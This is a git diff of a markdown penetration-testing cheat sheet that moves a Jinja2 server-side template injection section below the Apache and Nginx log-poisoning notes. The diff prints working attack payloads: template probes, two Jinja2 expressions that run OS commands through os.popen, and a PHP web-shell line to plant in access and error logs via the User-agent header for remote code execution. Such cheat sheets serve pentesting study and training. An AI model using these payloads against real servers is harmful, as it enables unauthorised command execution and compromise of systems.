@@ -509,19 +509,6 @@ Virutal Hosts file : `/etc/apache2/sites-available/000-default.conf`<br/>
 
 If we can read log files,we can poison them to get RCE<br />
 
-### SSTI (Server Side Template Injection)
-
-#### Jinja2
-To check if it's jinja test`{{7*'7'}}` this would return 7777
-
-Check for `{{4*4}}` on the url `http://IP/{{4*4}}` if it returns "16" as a result it is vulnerable to SSTI <br/>
-
-
-`{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}`
-
-**Exploit**
-`{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`
-
 #### For Apache2
 
 For apache `/var/log/apache2/access.log` try to access the log and if we can then add `<?php system($_GET['c']); ?>`in User-agent<br/>
@@ -529,6 +516,19 @@ For apache `/var/log/apache2/access.log` try to access the log and if we can the
 #### For Niginx
 
 For niginx `/var/log/nginx/error.log` try to access the log and if we can then add `<?php system($_GET['c']); ?>` in User-agent or try to add it in a file having a paramter make sure it's not being url encoded <br/>
+
+### SSTI (Server Side Template Injection)
+
+#### Jinja2
+To check if it's jinja test`{{7*'7'}}` this would return 7777
+
+Check for `{{4*4}}` on the url `http://IP/{{4*4}}` if it returns "16" as a result it is vulnerable to SSTI <br/>
+
+`{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}`<br/>
+
+**Exploit**<br/>
+`{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`
+
 
 
 ### XSS Session Hijacking
